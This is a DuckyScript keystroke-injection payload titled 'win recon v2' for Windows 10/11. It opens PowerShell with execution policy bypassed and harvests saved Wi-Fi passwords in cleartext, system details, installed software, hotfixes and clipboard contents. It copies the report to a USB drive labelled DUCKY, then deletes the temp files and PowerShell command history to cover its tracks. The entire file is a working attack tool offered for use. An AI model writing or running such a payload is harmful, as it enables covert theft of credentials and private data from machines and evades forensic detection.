REM Title:win recon v2
REM Author:nester
REM Description:
REM Target:win 10/11
ATTACKMODE HID STORAGE

DEFAULT_DELAY 50

DELAY 3000

GUI r
DELAY 800
STRING powershell -NoP -NonI -Exec Bypass
ENTER
DELAY 3000 

REM Vars
STRING $temp="$env:TEMP"; $report="$temp\recon.txt"; $clip="$temp\clip.txt"; $out=""
ENTER
DELAY 400

REM Wi-Fi
STRING $out += "`n=== Wi-Fi Profiles ===`n"
ENTER
STRING try { $wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }; foreach ($w in $wifi) { $p = (netsh wlan show profile name="$w" key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }); $out += "$w : $p`n" } } catch { $out += "WiFi error: $($_.Exception.Message)`n" }
ENTER
DELAY 600

REM System Info 
STRING $out += "`n=== System Info ===`n"
ENTER
STRING try { $i = Get-ComputerInfo; $out += "OS: $($i.OsName)`nBuild: $($i.OsBuildNumber)`nArch: $($i.OsArchitecture)`nHost: $($i.CsName)`nMfg: $($i.CsManufacturer)`nModel: $($i.CsModel)`nCPU Cores: $($i.CsNumberOfProcessors)`nRAM: $([math]::Round($i.CsTotalPhysicalMemory / 1GB, 2)) GB`nUptime: $($i.OsUptime)`n" } catch { $out += "SysInfo error: $($_.Exception.Message)`n" }
ENTER
DELAY 600

REM Installed Programs (registry, table output)
STRING $out += "`n=== Installed Programs ===`n"
ENTER
STRING try { $apps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -EA SilentlyContinue | Where { $_.DisplayName } | Select DisplayName,DisplayVersion,Publisher,InstallDate | Sort DisplayName; $out += ($apps | Format-Table -AutoSize | Out-String) } catch { $out += "Programs error: $($_.Exception.Message)`n" }
ENTER
DELAY 800

REM Hotfixes
STRING $out += "`n=== Hotfixes ===`n"
ENTER
STRING try { $fixes = Get-HotFix | Select HotFixID,Description,InstalledOn,InstalledBy | Sort InstalledOn -Descending; $out += ($fixes | Format-Table -AutoSize | Out-String) } catch { $out += "Hotfixes error: $($_.Exception.Message)`n" }
ENTER
DELAY 600

REM Clipboard
STRING $out += "`n=== Clipboard ===`n"
ENTER
STRING try { Get-Clipboard | Out-File $clip -Encoding utf8 -EA SilentlyContinue; $out += (Get-Content $clip -Raw -EA SilentlyContinue) } catch { $out += "Clipboard error: $($_.Exception.Message)`n" }
ENTER
DELAY 600

REM Write report locally first
STRING $out | Out-File $report -Encoding utf8 -Force -EA SilentlyContinue
ENTER
DELAY 700

REM Exfil
STRING try { $v = Get-Volume | Where { $_.FileSystemLabel -eq 'DUCKY' -and $_.DriveType -eq 'Removable' } | Select -First 1; if ($v) { $d = $v.DriveLetter + ':'; if (Test-Path $d) { Copy-Item $report,$clip "$d\" -Force -EA SilentlyContinue; $out += "`nExfil OK to $d" } else { $out += "`nDrive path bad" } } else { $out += "`nNo DUCKY drive" } } catch { $out += "`nExfil fail: $($_.Exception.Message)" }
ENTER
DELAY 600


STRING $out | Out-File $report -Encoding utf8 -Force -EA SilentlyContinue
ENTER
DELAY 500

REM Cleanup
STRING Remove-Item $report,$clip -Force -EA SilentlyContinue; Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -EA SilentlyContinue; Clear-History -EA SilentlyContinue; [GC]::Collect()
ENTER

STRING exit
ENTER
